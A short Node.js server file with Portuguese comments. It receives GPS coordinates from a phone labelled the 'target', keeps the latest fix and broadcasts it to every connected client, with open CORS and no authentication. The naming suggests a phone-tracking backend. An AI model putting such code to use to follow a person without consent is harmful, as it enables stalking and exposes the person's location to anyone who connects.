const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" } // Aceita conexão de qualquer celular
});
const path = require('path'); // ESSENCIAL PARA O RENDER

// --- CORREÇÃO DE CAMINHOS (Linux/Render) ---
// Isso diz pro servidor exatamente onde as pastas estão
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- ROTAS ---
app.get('/', (req, res) => res.render('home'));
app.get('/gps', (req, res) => res.render('gps'));
app.get('/zap', (req, res) => res.render('zap'));

// --- ROTA DE TESTE ---
app.get('/status', (req, res) => res.send('SERVIDOR ONLINE E RODANDO!'));

// --- MEMÓRIA ---
let lastKnownData = null;

io.on('connection', (socket) => {
    console.log(`[NOVA CONEXÃO] ID: ${socket.id}`);

    const role = socket.handshake.query.role;

    if (role === 'target') {
        console.log(`>>> CELULAR CONECTADO: ${socket.id}`);
        
        socket.on('report_location', (data) => {
            console.log(`RECEBIDO: Lat ${data.lat} / Lng ${data.lng}`);
            lastKnownData = data;
            io.emit('gps_update', data);
        });

    } else {
        // Se for o site, manda o que tiver na memória
        if (lastKnownData) socket.emit('gps_update', lastKnownData);
    }
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`[START] Rodando na porta ${PORT}`);
});